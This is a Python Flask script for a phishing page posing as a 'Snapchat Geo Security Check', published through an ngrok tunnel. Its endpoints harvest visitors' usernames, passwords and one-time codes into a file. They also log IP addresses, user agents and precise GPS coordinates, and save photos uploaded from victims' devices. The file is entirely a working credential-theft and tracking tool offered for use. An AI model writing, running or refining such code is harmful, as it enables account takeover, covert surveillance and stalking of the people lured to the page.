import os
import subprocess
import time
import requests
import threading
from datetime import datetime
from flask import Flask, request, render_template, jsonify

NGROK_AUTH_TOKEN = "YOUR_AUTHTOKEN_HERE"
NGROK_PATH = "ngrok" 
FLASK_PORT = 5000

app = Flask(__name__)
os.makedirs("captures", exist_ok=True)

def print_banner():
    banner = r"""
   _____                           _             _   _                 
  / ____|                         | |           | | (_)                
 | (___   __ _  ___ ___  ___  ___ | |_ ___   ___| |_ _  ___  _ __  ___ 
  \___ \ / _` |/ __/ _ \/ __|/ _ \| __/ _ \ / __| __| |/ _ \| '_ \/ __|
  ____) | (_| | (_|  __/\__ \ (_) | || (_) | (__| |_| | (_) | | | \__ \
 |_____/ \__,_|\___\___||___/\___/ \__\___/ \___|\__|_|\___/|_| |_|___/
                                                                        
    """
    print(banner)
    print("Starting Snapchat Geo Security Check server...")
    print("Injecting ngrok authtoken...")

def add_ngrok_authtoken():
    try:
        subprocess.run([NGROK_PATH, "config", "add-authtoken", NGROK_AUTH_TOKEN], check=True, capture_output=True)
        print("[+] Ngrok authtoken added.")
    except subprocess.CalledProcessError:
        print("[!] Authtoken already set or failed to apply.")

def start_ngrok(port):
    ngrok_cmd = [NGROK_PATH, "http", str(port)]
    print(f"[+] Launching ngrok tunnel on port {port} ...")
    ngrok_proc = subprocess.Popen(ngrok_cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)

    public_url = None
    for _ in range(15):  # wait for tunnel to start
        try:
            resp = requests.get("http://127.0.0.1:4040/api/tunnels")
            tunnels = resp.json().get("tunnels", [])
            for t in tunnels:
                if t["proto"] == "https":
                    public_url = t["public_url"]
                    break
            if public_url:
                break
        except Exception:
            time.sleep(1)

    if public_url:
        print(f"[+] Public ngrok URL: {public_url}")
    else:
        print("[!] Failed to retrieve ngrok public URL.")

    return ngrok_proc, public_url

@app.route("/")
def home():
    return render_template("index.html")

@app.route("/log", methods=["POST"])
def log_info():
    data = request.json or {}
    user_ip = request.headers.get("X-Forwarded-For", request.remote_addr)
    user_agent = request.headers.get("User-Agent", "Unknown")
    lat = data.get('lat', 'N/A')
    lon = data.get('lon', 'N/A')
    accuracy = data.get('accuracy', 'N/A')
    timezone = data.get('timezone', 'N/A')

    print("[NEW VISITOR]")
    print(f"IP Address : {user_ip}")
    print(f"User Agent : {user_agent}")
    print(f"Latitude   : {lat}")
    print(f"Longitude  : {lon}")
    print(f"Accuracy   : {accuracy}")
    print(f"Time Zone  : {timezone}")
    print("-" * 30)

    with open("visitor_data.txt", "a", encoding="utf-8") as f:
        f.write(f"{datetime.now()} | IP: {user_ip} | UA: {user_agent} | Lat: {lat} | Lon: {lon} | Accuracy: {accuracy} | Timezone: {timezone}\n")

    return jsonify({"status": "success"})

@app.route("/upload_photo", methods=["POST"])
def upload_photo():
    file = request.files.get("photo")
    if not file:
        return "No photo uploaded", 400
    
    original_ext = os.path.splitext(file.filename)[1].lower()
    if original_ext not in [".jpg", ".jpeg", ".png"]:
        original_ext = ".jpg"
    
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    save_filename = f"{timestamp}{original_ext}"
    save_path = os.path.join("captures", save_filename)
    
    file.save(save_path)
    print(f"[+] Photo saved: {save_path}")
    return jsonify({"status": "photo saved"})

@app.route("/submit", methods=["POST"])
def submit_creds():
    username = request.form.get("username", "")
    password = request.form.get("password", "")
    otp = request.form.get("otp", "")
    user_ip = request.headers.get("X-Forwarded-For", request.remote_addr)
    user_agent = request.headers.get("User-Agent", "Unknown")

    print(f"Creds: {username}:{password} | OTP: {otp} | IP: {user_ip}")
    with open("creds.txt", "a", encoding="utf-8") as f:
        f.write(f"{datetime.now()} | {username}:{password} | OTP: {otp} | IP: {user_ip} | UA: {user_agent}\n")

    return "Verification complete."

if __name__ == "__main__":
    print_banner()
    add_ngrok_authtoken()

    ngrok_proc, public_url = start_ngrok(FLASK_PORT)

    flask_thread = threading.Thread(target=lambda: app.run(host="0.0.0.0", port=FLASK_PORT, debug=False, use_reloader=False), daemon=True)
    flask_thread.start()

    if public_url:
        print(f"\n[+] Open this link in your browser: {public_url}\n")

    try:
        print("[+] Server is running. Press CTRL+C to stop.")
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n[!] Shutting down server...")
    finally:
        if ngrok_proc:
            ngrok_proc.terminate()
            print("[+] Ngrok process terminated.")
